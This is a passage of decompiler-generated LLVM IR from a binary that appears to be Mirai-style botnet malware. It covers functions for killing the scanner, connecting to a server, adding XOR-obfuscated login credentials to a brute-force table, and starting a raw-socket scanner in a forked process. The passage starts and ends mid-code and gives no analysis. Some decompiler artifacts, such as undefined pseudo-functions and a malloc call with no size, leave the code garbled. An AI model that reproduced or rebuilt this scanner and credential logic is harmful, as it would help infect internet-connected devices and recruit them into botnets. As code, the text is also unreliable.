  %v2_f2f0 = load i32, i32* @global_var_235b4.153, align 4
  store i32 %v2_f2f0, i32* %ip.global-to-local, align 4
  %v4_f2f4 = udiv i32 %v5_f2e4, 256
  %v5_f2f4 = xor i32 %v2_f2e8, %v4_f2f4
  store i32 %v5_f2f4, i32* @r4, align 4
  %v2_f2fc = inttoptr i32 %v1_f2fc to i32*
  store i32 %v2_f2ec, i32* %v2_f2fc, align 4
  %v0_f300 = load i32, i32* %ip.global-to-local, align 4
  %v1_f300 = load i32, i32* %r8.global-to-local, align 4
  %v2_f300 = inttoptr i32 %v1_f300 to i32*
  store i32 %v0_f300, i32* %v2_f300, align 4
  %v0_f304 = load i32, i32* %r2.global-to-local, align 4
  %v1_f304 = load i32, i32* %r7.global-to-local, align 4
  %v2_f304 = inttoptr i32 %v1_f304 to i32*
  store i32 %v0_f304, i32* %v2_f304, align 4
  %v0_f308 = load i32, i32* @r4, align 4
  %v1_f308 = load i32, i32* @r6, align 4
  %v2_f308 = inttoptr i32 %v1_f308 to i32*
  store i32 %v0_f308, i32* %v2_f308, align 4
  %v2_f30c = call i32 @util_strlen(i8* %v2_f2b8)
  %v0_f314 = load i32, i32* @r4, align 4
  %v3_f318 = urem i32 %v0_f314, %v2_f30c
  %v2_f320 = add i32 %v3_f318, %v2_f31c
  %v1_f324 = add i32 %v2_f320, -32
  %v2_f324 = inttoptr i32 %v1_f324 to i8*
  %v3_f324 = load i8, i8* %v2_f324, align 1
  %v2_f328 = load i32, i32* @r5, align 4
  %v3_f328 = load i32, i32* %fp.global-to-local, align 4
  %v4_f328 = add i32 %v3_f328, %v2_f328
  %v5_f328 = inttoptr i32 %v4_f328 to i8*
  store i8 %v3_f324, i8* %v5_f328, align 1
  %v0_f32c = load i32, i32* @r5, align 4
  %v1_f32c = add i32 %v0_f32c, 1
  store i32 %v1_f32c, i32* @r5, align 4
  %v1_f330 = load i32, i32* %sb.global-to-local, align 4
  %v9_f330 = icmp eq i32 %v1_f32c, %v1_f330
  br i1 %v9_f330, label %dec_label_pc_f338, label %dec_label_pc_f2d8.dec_label_pc_f2d8_crit_edge

dec_label_pc_f2d8.dec_label_pc_f2d8_crit_edge:    ; preds = %dec_label_pc_f2d8
  %v1_f2fc.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_f2d8

dec_label_pc_f338:                                ; preds = %dec_label_pc_f2d8, %entry
  %v1_f33c = call i32 @table_lock_val(i32 61)
  store i32 %v3_f28c, i32* @r4, align 4
  store i32 %v6_f28c, i32* @r5, align 4
  store i32 %v9_f28c, i32* @r6, align 4
  ret i32 %v1_f33c

; uselistorder directives
  uselistorder i32 %v2_f2dc, { 1, 0 }
  uselistorder i32 %v2_f2d8, { 1, 0, 2 }
  uselistorder i32* @global_var_235b8.149, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_235b4.153, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_235b0.151, { 2, 5, 3, 1, 0, 4 }
  uselistorder i32* @global_var_235ac.147, { 2, 4, 1, 0, 3 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_f368 = load i32, i32* @global_var_260d8.163, align 4
  %v2_f370 = call i32 @kill(i32 %v2_f368, i32 9)
  ret i32 %v2_f370

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 5, 4, 3, 2, 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f384 = load i32, i32* @r4, align 4
  store i32 %v3_f384, i32* %stack_var_-16, align 4
  %v6_f384 = load i32, i32* @r5, align 4
  %v9_f384 = load i32, i32* @r6, align 4
  %v12_f384 = load i32, i32* @lr, align 4
  %v0_f388 = load i32, i32* @r0, align 4
  store i32 %v0_f388, i32* @r5, align 4
  %v1_f38c = add i32 %v0_f388, 4
  %v2_f38c = inttoptr i32 %v1_f38c to i32*
  %v3_f38c = load i32, i32* %v2_f38c, align 4
  store i32 %v3_f38c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 62384, i32* @lr, align 4
  %v1_f3ac = icmp ne i32 %v3_f38c, -1
  call void @__pseudo_cond_branch(i1 %v1_f3ac, i32 ptrtoint (i32* @global_var_15720.34 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_f3b8 = load i32, i32* @r6, align 4
  store i32 %v0_f3b8, i32* %r2.global-to-local, align 4
  %v3_f3bc = call i32 @socket(i32 2, i32 1, i32 %v0_f3b8)
  store i32 %v3_f3bc, i32* %r0.global-to-local, align 4
  %v7_f3c0 = icmp eq i32 %v3_f3bc, -1
  %v1_f3c4 = load i32, i32* @r5, align 4
  %v2_f3c4 = add i32 %v1_f3c4, 4
  %v3_f3c4 = inttoptr i32 %v2_f3c4 to i32*
  store i32 %v3_f3bc, i32* %v3_f3c4, align 4
  br i1 %v7_f3c0, label %entry.dec_label_pc_f43c_crit_edge, label %dec_label_pc_f3cc

entry.dec_label_pc_f43c_crit_edge:                ; preds = %entry
  %v1_f444.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f43c

dec_label_pc_f3cc:                                ; preds = %entry
  %v2_f390 = ptrtoint i32* %stack_var_-32 to i32
  %v0_f3cc = load i32, i32* @r5, align 4
  %v1_f3cc = add i32 %v0_f3cc, 28
  store i32 %v1_f3cc, i32* %r0.global-to-local, align 4
  %v0_f3d0 = load i32, i32* @r6, align 4
  %v2_f3d0 = add i32 %v0_f3cc, 24
  %v3_f3d0 = inttoptr i32 %v2_f3d0 to i32*
  store i32 %v0_f3d0, i32* %v3_f3d0, align 4
  %v2_f3d8 = call i32 @util_zero(i32 %v1_f3cc, i32 256)
  store i32 %v2_f3d8, i32* %r0.global-to-local, align 4
  %v0_f3dc = load i32, i32* @r5, align 4
  %v1_f3dc = add i32 %v0_f3dc, 4
  %v2_f3dc = inttoptr i32 %v1_f3dc to i32*
  %v3_f3dc = load i32, i32* %v2_f3dc, align 4
  store i32 %v3_f3dc, i32* @r4, align 4
  %v0_f3e0 = load i32, i32* @r6, align 4
  store i32 %v0_f3e0, i32* @r2, align 4
  store i32 %v3_f3dc, i32* %r0.global-to-local, align 4
  %v2_f3ec = call i32 @__libc_fcntl(i32 %v3_f3dc, i32 3)
  %v1_f3f4 = or i32 %v2_f3ec, 2048
  store i32 %v1_f3f4, i32* @r2, align 4
  %v0_f3f8 = load i32, i32* @r4, align 4
  store i32 %v0_f3f8, i32* %r0.global-to-local, align 4
  %v2_f3fc = call i32 @__libc_fcntl(i32 %v0_f3f8, i32 4)
  store i32 %v2_f3fc, i32* %r0.global-to-local, align 4
  %v2_f404 = load i32, i32* @global_var_235f0.165, align 4
  store i32 %v2_f404, i32* %r2.global-to-local, align 4
  %v1_f40c = load i32, i32* @r5, align 4
  %v2_f40c = add i32 %v1_f40c, 12
  %v3_f40c = inttoptr i32 %v2_f40c to i32*
  store i32 1, i32* %v3_f40c, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_f418 = load i32, i32* %r2.global-to-local, align 4
  %v1_f418 = load i32, i32* @r5, align 4
  %v2_f418 = add i32 %v1_f418, 8
  %v3_f418 = inttoptr i32 %v2_f418 to i32*
  store i32 %v0_f418, i32* %v3_f418, align 4
  %v0_f41c = load i32, i32* @r5, align 4
  %v1_f420 = add i32 %v0_f41c, 4
  %v2_f420 = inttoptr i32 %v1_f420 to i32*
  %v3_f420 = load i32, i32* %v2_f420, align 4
  store i32 %v3_f420, i32* %r0.global-to-local, align 4
  %v1_f424 = add i32 %v0_f41c, 20
  %v2_f424 = inttoptr i32 %v1_f424 to i16*
  %v3_f424 = load i16, i16* %v2_f424, align 2
  %v4_f424 = zext i16 %v3_f424 to i32
  store i32 %v4_f424, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_f438 = call i32 @__libc_connect(i32 %v3_f420, i32 %v2_f390, i32 16)
  store i32 %v3_f438, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f43c

dec_label_pc_f43c:                                ; preds = %entry.dec_label_pc_f43c_crit_edge, %dec_label_pc_f3cc
  %v1_f444 = phi i32 [ %v1_f444.pre, %entry.dec_label_pc_f43c_crit_edge ], [ %v3_f438, %dec_label_pc_f3cc ]
  %v2_f440 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f440, i32* @r4, align 4
  store i32 %v6_f384, i32* @r5, align 4
  store i32 %v9_f384, i32* @r6, align 4
  store i32 %v12_f384, i32* @lr, align 4
  ret i32 %v1_f444

; uselistorder directives
  uselistorder i32 %v3_f3bc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 6, 5, 9, 10, 8, 7 }
  uselistorder i32 (i32, i32)* @util_zero, { 12, 9, 8, 7, 11, 10, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f43c, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_f44c = load i32, i32* @r4, align 4
  %v6_f44c = load i32, i32* @r5, align 4
  %v9_f44c = load i32, i32* @r6, align 4
  %v12_f44c = load i32, i32* @r7, align 4
  %v15_f44c = load i32, i32* @r8, align 4
  %v18_f44c = load i32, i32* @sb, align 4
  %v21_f44c = load i32, i32* @sl, align 4
  %v24_f44c = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_235bc.167 to i32), i32* @fp, align 4
  %v2_f454 = load i32, i32* @global_var_235bc.167, align 4
  store i32 ptrtoint (i32* @global_var_235e8.169 to i32), i32* @sl, align 4
  %v1_f460 = add i32 %v2_f454, 1
  store i32 %v1_f460, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_f46c = load i32, i32* @global_var_235e8.169, align 4
  store i32 %v2_f46c, i32* %r0.global-to-local, align 4
  %v3_f470 = mul i32 %v1_f460, 16
  store i32 %v3_f470, i32* %r1.global-to-local, align 4
  %v4_f478 = inttoptr i32 %v2_f46c to i32*
  %v5_f478 = call i32 @realloc(i32* %v4_f478, i32 %v3_f470, i32 %arg3, i32 %v1_f460)
  %v2_f47c = load i32, i32* @global_var_235bc.167, align 4
  store i32 %v2_f47c, i32* %r2.global-to-local, align 4
  store i32 %v5_f478, i32* @r8, align 4
  %v0_f484 = load i32, i32* @r5, align 4
  store i32 %v0_f484, i32* %r0.global-to-local, align 4
  %v1_f48c = load i32, i32* @sl, align 4
  %v2_f48c = inttoptr i32 %v1_f48c to i32*
  store i32 %v5_f478, i32* %v2_f48c, align 4
  %v1_f490 = inttoptr i32 %v0_f484 to i8*
  %v2_f490 = call i32 @util_strlen(i8* %v1_f490)
  %sext = mul i32 %v2_f490, 16777216
  %v1_f494 = sdiv i32 %sext, 16777216
  %v2_f494 = add nsw i32 %v1_f494, 1
  store i32 %v2_f494, i32* @r4, align 4
  store i32 %v1_f494, i32* @r7, align 4
  store i32 %v2_f494, i32* @r0, align 4
  %v0_f4a0 = call i32 @malloc()
  store i32 %v0_f4a0, i32* %r0.global-to-local, align 4
  %v0_f4a4 = load i32, i32* @r5, align 4
  store i32 %v0_f4a4, i32* %r1.global-to-local, align 4
  %v0_f4a8 = load i32, i32* @r4, align 4
  store i32 %v0_f4a8, i32* %r2.global-to-local, align 4
  store i32 %v0_f4a0, i32* %r6.global-to-local, align 4
  %v3_f4b0 = call i32 @util_memcpy(i32 %v0_f4a0, i32 %v0_f4a4, i32 %v0_f4a8)
  store i32 %v3_f4b0, i32* %r0.global-to-local, align 4
  %v0_f4b4 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_f4b4, 1
  %extract.t6 = trunc i32 %v0_f4b4 to i8
  br i1 %tmp22, label %dec_label_pc_f4d8, label %dec_label_pc_f4bc

dec_label_pc_f4bc:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f4c0

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f4c0, %dec_label_pc_f4bc
  %v2_f4c8 = phi i32 [ %v1_f4cc, %dec_label_pc_f4c0 ], [ 0, %dec_label_pc_f4bc ]
  %v1_f4c0 = load i32, i32* %r6.global-to-local, align 4
  %v2_f4c0 = add i32 %v1_f4c0, %v2_f4c8
  %v3_f4c0 = inttoptr i32 %v2_f4c0 to i8*
  %v4_f4c0 = load i8, i8* %v3_f4c0, align 1
  %v6_f4c0 = zext i8 %v4_f4c0 to i32
  %v1_f4c4 = xor i32 %v6_f4c0, 80
  store i32 %v1_f4c4, i32* %r3.global-to-local, align 4
  %v1_f4c8 = trunc i32 %v1_f4c4 to i8
  store i8 %v1_f4c8, i8* %v3_f4c0, align 1
  %v0_f4cc = load i32, i32* %r2.global-to-local, align 4
  %v1_f4cc = add i32 %v0_f4cc, 1
  store i32 %v1_f4cc, i32* %r2.global-to-local, align 4
  %v1_f4d0 = load i32, i32* @r7, align 4
  %v9_f4d0 = icmp eq i32 %v1_f4cc, %v1_f4d0
  br i1 %v9_f4d0, label %dec_label_pc_f4d8.loopexit, label %dec_label_pc_f4c0

dec_label_pc_f4d8.loopexit:                       ; preds = %dec_label_pc_f4c0
  %extract.t = trunc i32 %v1_f4cc to i8
  br label %dec_label_pc_f4d8

dec_label_pc_f4d8:                                ; preds = %dec_label_pc_f4d8.loopexit, %entry
  %v0_f4e8.off0 = phi i8 [ %extract.t, %dec_label_pc_f4d8.loopexit ], [ %extract.t6, %entry ]
  %v2_f4d8 = load i32, i32* @global_var_235bc.167, align 4
  %v2_f4dc = load i32, i32* @global_var_235e8.169, align 4
  %v3_f4e0 = mul i32 %v2_f4d8, 16
  store i32 %v3_f4e0, i32* @sb, align 4
  %v2_f4e4 = add i32 %v2_f4dc, %v3_f4e0
  store i32 %v2_f4e4, i32* %r2.global-to-local, align 4
  %v3_f4e8 = add i32 %v2_f4e4, 12
  %v4_f4e8 = inttoptr i32 %v3_f4e8 to i8*
  store i8 %v0_f4e8.off0, i8* %v4_f4e8, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_f47c, i32* %r3.global-to-local, align 4
  %v0_f4f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_f4f4 = load i32, i32* @r8, align 4
  %v5_f4f4 = mul i32 %v2_f47c, 16
  %v6_f4f4 = add i32 %v1_f4f4, %v5_f4f4
  %v7_f4f4 = inttoptr i32 %v6_f4f4 to i32*
  store i32 %v0_f4f4, i32* %v7_f4f4, align 4
  %v2_f4f8 = load i32, i32* @global_var_235e8.169, align 4
  store i32 %v2_f4f8, i32* @r7, align 4
  %v1_f4fc = inttoptr i32 %arg2 to i8*
  %v2_f4fc = call i32 @util_strlen(i8* %v1_f4fc)
  %sext1 = mul i32 %v2_f4fc, 16777216
  %v1_f500 = sdiv i32 %sext1, 16777216
  %v2_f500 = add nsw i32 %v1_f500, 1
  store i32 %v2_f500, i32* @r4, align 4
  store i32 %v1_f500, i32* @r6, align 4
  store i32 %v2_f500, i32* @r0, align 4
  %v0_f50c = call i32 @malloc()
  store i32 %v0_f50c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_f514 = load i32, i32* @r4, align 4
  store i32 %v0_f514, i32* %r2.global-to-local, align 4
  store i32 %v0_f50c, i32* %r5.global-to-local, align 4
  %v3_f51c = call i32 @util_memcpy(i32 %v0_f50c, i32 %arg2, i32 %v0_f514)
  store i32 %v3_f51c, i32* %r0.global-to-local, align 4
  %v0_f520 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_f520, 1
  %extract.t8 = trunc i32 %v0_f520 to i8
  br i1 %tmp23, label %dec_label_pc_f544, label %dec_label_pc_f528

dec_label_pc_f528:                                ; preds = %dec_label_pc_f4d8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f52c

dec_label_pc_f52c:                                ; preds = %dec_label_pc_f52c, %dec_label_pc_f528
  %v2_f534 = phi i32 [ %v1_f538, %dec_label_pc_f52c ], [ 0, %dec_label_pc_f528 ]
  %v1_f52c = load i32, i32* %r5.global-to-local, align 4
  %v2_f52c = add i32 %v1_f52c, %v2_f534
  %v3_f52c = inttoptr i32 %v2_f52c to i8*
  %v4_f52c = load i8, i8* %v3_f52c, align 1
  %v6_f52c = zext i8 %v4_f52c to i32
  %v1_f530 = xor i32 %v6_f52c, 80
  store i32 %v1_f530, i32* %r3.global-to-local, align 4
  %v1_f534 = trunc i32 %v1_f530 to i8
  store i8 %v1_f534, i8* %v3_f52c, align 1
  %v0_f538 = load i32, i32* %r2.global-to-local, align 4
  %v1_f538 = add i32 %v0_f538, 1
  store i32 %v1_f538, i32* %r2.global-to-local, align 4
  %v1_f53c = load i32, i32* @r6, align 4
  %v9_f53c = icmp eq i32 %v1_f538, %v1_f53c
  br i1 %v9_f53c, label %dec_label_pc_f544.loopexit, label %dec_label_pc_f52c

dec_label_pc_f544.loopexit:                       ; preds = %dec_label_pc_f52c
  %extract.t7 = trunc i32 %v1_f538 to i8
  br label %dec_label_pc_f544

dec_label_pc_f544:                                ; preds = %dec_label_pc_f544.loopexit, %dec_label_pc_f4d8
  %v0_f554.off0 = phi i8 [ %extract.t7, %dec_label_pc_f544.loopexit ], [ %extract.t8, %dec_label_pc_f4d8 ]
  %v2_f544 = load i32, i32* @global_var_235bc.167, align 4
  store i32 %v2_f544, i32* %r0.global-to-local, align 4
  %v2_f548 = load i32, i32* @global_var_235e8.169, align 4
  %v3_f54c = mul i32 %v2_f544, 16
  store i32 %v3_f54c, i32* %r1.global-to-local, align 4
  %v2_f550 = or i32 %v3_f54c, 13
  %v3_f554 = add i32 %v2_f550, %v2_f548
  %v4_f554 = inttoptr i32 %v3_f554 to i8*
  store i8 %v0_f554.off0, i8* %v4_f554, align 1
  store i32 ptrtoint (i16** @global_var_235ec.171 to i32), i32* %r4.global-to-local, align 4
  %v2_f560 = load i16, i16* bitcast (i16** @global_var_235ec.171 to i16*), align 4
  %v3_f560 = zext i16 %v2_f560 to i32
  store i32 %v3_f560, i32* %lr.global-to-local, align 4
  %v2_f568 = load i32, i32* @global_var_235e8.169, align 4
  store i32 %v2_f568, i32* %r2.global-to-local, align 4
  %v0_f570 = load i32, i32* %r1.global-to-local, align 4
  %v2_f570 = add i32 %v0_f570, %v2_f568
  store i32 %v2_f570, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_235ec.171 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_f578 = load i32, i32* @sb, align 4
  %v1_f578 = load i32, i32* @r7, align 4
  %v2_f578 = add i32 %v1_f578, %v0_f578
  store i32 %v2_f578, i32* %ip.global-to-local, align 4
  %v0_f57c = load i32, i32* %r0.global-to-local, align 4
  %v1_f57c = add i32 %v0_f57c, 1
  store i32 %v1_f57c, i32* %r0.global-to-local, align 4
  %v3_f580 = add i32 %v2_f570, 10
  %v4_f580 = inttoptr i32 %v3_f580 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_235ec.171 to i32), i32 16), i32 16) to i16), i16* %v4_f580, align 2
  %v0_f584 = load i32, i32* %lr.global-to-local, align 4
  %v1_f584 = trunc i32 %v0_f584 to i16
  %v2_f584 = load i32, i32* %r1.global-to-local, align 4
  %v3_f584 = add i32 %v2_f584, 8
  %v4_f584 = inttoptr i32 %v3_f584 to i16*
  store i16 %v1_f584, i16* %v4_f584, align 2
  %v0_f588 = load i32, i32* %r5.global-to-local, align 4
  %v1_f588 = load i32, i32* %ip.global-to-local, align 4
  %v2_f588 = add i32 %v1_f588, 4
  %v3_f588 = inttoptr i32 %v2_f588 to i32*
  store i32 %v0_f588, i32* %v3_f588, align 4
  %v1_f58c = load i32, i32* @fp, align 4
  %v2_f58c = inttoptr i32 %v1_f58c to i32*
  store i32 %v1_f57c, i32* %v2_f58c, align 4
  %v0_f590 = load i32, i32* %r3.global-to-local, align 4
  %v1_f590 = trunc i32 %v0_f590 to i16
  %v2_f590 = load i32, i32* %r4.global-to-local, align 4
  %v3_f590 = inttoptr i32 %v2_f590 to i16*
  store i16 %v1_f590, i16* %v3_f590, align 2
  store i32 %v3_f44c, i32* @r4, align 4
  store i32 %v6_f44c, i32* @r5, align 4
  store i32 %v9_f44c, i32* @r6, align 4
  store i32 %v12_f44c, i32* @r7, align 4
  store i32 %v15_f44c, i32* @r8, align 4
  store i32 %v18_f44c, i32* @sb, align 4
  store i32 %v21_f44c, i32* @sl, align 4
  store i32 %v24_f44c, i32* @fp, align 4
  ret i32 %v1_f57c

; uselistorder directives
  uselistorder i32 %v3_f54c, { 1, 0 }
  uselistorder i32 %v1_f538, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f50c, { 1, 0, 2 }
  uselistorder i32 %v3_f4e0, { 1, 0 }
  uselistorder i32 %v1_f4cc, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f4a0, { 1, 0, 2 }
  uselistorder i32 %v2_f47c, { 1, 0, 2 }
  uselistorder i32 %v3_f470, { 1, 0 }
  uselistorder i32 %v1_f460, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 18, 2, 19, 20, 21, 22, 23, 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp314 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i16, align 2
  %tmp342 = call i16 @__decompiler_undefined_function_1()
  %v6_f5ac = load i32, i32* @r5, align 4
  %v18_f5ac = load i32, i32* @sb, align 4
  %v21_f5ac = load i32, i32* @sl, align 4
  %v24_f5ac = load i32, i32* @fp, align 4
  %v0_f5b8 = call i32 @__libc_fork()
  store i32 %v0_f5b8, i32* %r0.global-to-local, align 4
  %v7_f5bc = icmp eq i32 %v0_f5b8, -1
  %. = zext i1 %v7_f5bc to i32
  %tmp345 = icmp slt i32 %v0_f5b8, 1
  %storemerge308 = select i1 %tmp345, i32 %., i32 1
  store i32 %storemerge308, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_260d8.163 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5d8 = icmp eq i32 %storemerge308, 0
  store i1 %v2_f5d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_f5b8, i32* @global_var_260d8.163, align 4
  br i1 %v2_f5d8, label %dec_label_pc_f5f4, label %dec_label_pc_f5e4

dec_label_pc_f5e4:                                ; preds = %entry
  store i32 %v6_f5ac, i32* @r5, align 4
  store i32 %v18_f5ac, i32* @sb, align 4
  store i32 %v21_f5ac, i32* @sl, align 4
  store i32 %v24_f5ac, i32* @fp, align 4
  ret i32 %v0_f5b8

dec_label_pc_f5f4:                                ; preds = %entry
  %v0_f5f4 = call i32 @util_local_addr()
  store i32 %v0_f5f4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_260b8.92 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_f5f4, i32* @global_var_260b8.92, align 4
  %v1_f600 = call i32 @rand_init(i32 %v0_f5f4)
  %v0_f604 = load i32, i32* @r4, align 4
  store i32 %v0_f604, i32* %r0.global-to-local, align 4
  %v1_f608 = inttoptr i32 %v0_f604 to i32*
  %v2_f608 = call i32 @__GI_time(i32* %v1_f608)
  store i32 ptrtoint (i32* @global_var_235f0.165 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_f608, i32* @global_var_235f0.165, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_f61c = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_260d0.176 to i32), i32* %r3.global-to-local, align 4
  %v0_f624 = load i32, i32* @r4, align 4
  %v5_f624 = trunc i32 %v0_f624 to i16
  store i16 %v5_f624, i16* %stack_var_-52, align 2
  store i32 %v2_f61c, i32* @global_var_260d0.176, align 4
  store i32 %v0_f624, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f630

dec_label_pc_f630:                                ; preds = %dec_label_pc_f630.dec_label_pc_f630_crit_edge, %dec_label_pc_f5f4
  %v2_f63c = phi i32 [ %v2_f63c.pre, %dec_label_pc_f630.dec_label_pc_f630_crit_edge ], [ %v2_f61c, %dec_label_pc_f5f4 ]
  %v0_f644 = phi i32 [ %v0_f674, %dec_label_pc_f630.dec_label_pc_f630_crit_edge ], [ %v0_f624, %dec_label_pc_f5f4 ]
  %v3_f630162 = phi i16 [ %v5_f674, %dec_label_pc_f630.dec_label_pc_f630_crit_edge ], [ %v5_f624, %dec_label_pc_f5f4 ]
  %v4_f630 = sext i16 %v3_f630162 to i32
  %v3_f638 = mul i32 %v0_f644, 256
  store i32 %v3_f638, i32* %ip.global-to-local, align 4
  store i32 %v2_f63c, i32* @lr, align 4
  %v2_f64c = mul nsw i32 %v4_f630, 288
  %v2_f650 = mul i32 %v0_f644, 288
  %v1_f654 = add nsw i32 %v4_f630, 1
  store i32 %v1_f654, i32* %r0.global-to-local, align 4
  %v2_f658 = add i32 %v2_f64c, %v2_f63c
  store i32 %v2_f658, i32* %r2.global-to-local, align 4
  %v2_f65c = add i32 %v2_f650, %v2_f63c
  store i32 %v2_f65c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_f66c = add i32 %v2_f658, 4
  %v3_f66c = inttoptr i32 %v2_f66c to i32*
  store i32 -1, i32* %v3_f66c, align 4
  %v0_f670 = load i32, i32* @r5, align 4
  %v1_f670 = load i32, i32* %r1.global-to-local, align 4
  %v2_f670 = add i32 %v1_f670, 12
  %v3_f670 = inttoptr i32 %v2_f670 to i32*
  store i32 %v0_f670, i32* %v3_f670, align 4
  %v0_f674 = load i32, i32* %r0.global-to-local, align 4
  %v5_f674 = trunc i32 %v0_f674 to i16
  %v7_f678 = icmp sgt i16 %v3_f630162, 254
  br i1 %v7_f678, label %dec_label_pc_f67c, label %dec_label_pc_f630.dec_label_pc_f630_crit_edge

dec_label_pc_f630.dec_label_pc_f630_crit_edge:    ; preds = %dec_label_pc_f630
  %v2_f63c.pre = load i32, i32* @global_var_260d0.176, align 4
  br label %dec_label_pc_f630

dec_label_pc_f67c:                                ; preds = %dec_label_pc_f630
  store i16 %v5_f674, i16* %stack_var_-52, align 2
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_f688 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_f688, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_260d4.178 to i32), i32* %r2.global-to-local, align 4
  %v2_f690 = icmp eq i32 %v3_f688, -1
  store i1 %v2_f690, i1* %cpsr_c.global-to-local, align 1
  %v7_f690 = icmp eq i32 %v3_f688, -1
  store i1 %v7_f690, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f688, i32* @r4, align 4
  store i32 %v3_f688, i32* @global_var_260d4.178, align 4
  br i1 %v7_f690, label %dec_label_pc_fdfc, label %dec_label_pc_f6a0

dec_label_pc_f6a0:                                ; preds = %dec_label_pc_f67c
